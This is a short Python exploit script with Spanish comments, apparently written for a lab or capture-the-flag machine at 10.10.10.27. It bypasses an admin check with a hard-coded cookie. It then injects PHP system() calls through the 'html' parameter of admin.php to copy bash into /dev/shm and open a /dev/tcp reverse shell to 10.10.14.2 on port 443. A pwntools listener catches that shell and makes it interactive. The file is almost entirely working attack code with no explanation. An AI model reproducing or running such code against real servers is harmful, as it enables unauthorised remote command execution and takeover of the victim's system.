#!/usr/bin/python3

# Tramitar peticiones
import requests
# Debuguear codigo
import pdb
# Llamadas al sistema
import sys
# Controlar el Ctrl + C
import signal
# Para manejar hilos
import threading
import time

from pwn import *

def def_handler(sig, frame):
	print("\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url="http://10.10.10.27/admin.php"
burp = {'http': 'http://127.0.0.1:8080'}
lport = 443

def makeRequest():
	headers = {
		'Cookie': 'adminpowa=noonecares'
	}

	r = requests.get(main_url + "?html=<?php%20system(\"cp%20/bin/bash%20/dev/shm/dxz\");%20?>", headers=headers)
	r = requests.get(main_url + "?html=<?php%20system(\"chmod%20+x%20/dev/shm/dxz\");%20?>", headers=headers)
	r = requests.get(main_url + "?html=<?php%20system(\"/dev/shm/dxz%20-c%20'/dev/shm/dxz%20-i%20>%26%20/dev/tcp/10.10.14.2/443%200>%261'\");%20?>", headers=headers, proxies=burp)

	print(r.text)

if __name__ == '__main__':
	try:
		threading.Thread(target=makeRequest,args=()).start()
	except Exception as e:
		log.error(str(e))

	shell = listen(lport, timeout=10).wait_for_connection()
	shell.interactive()
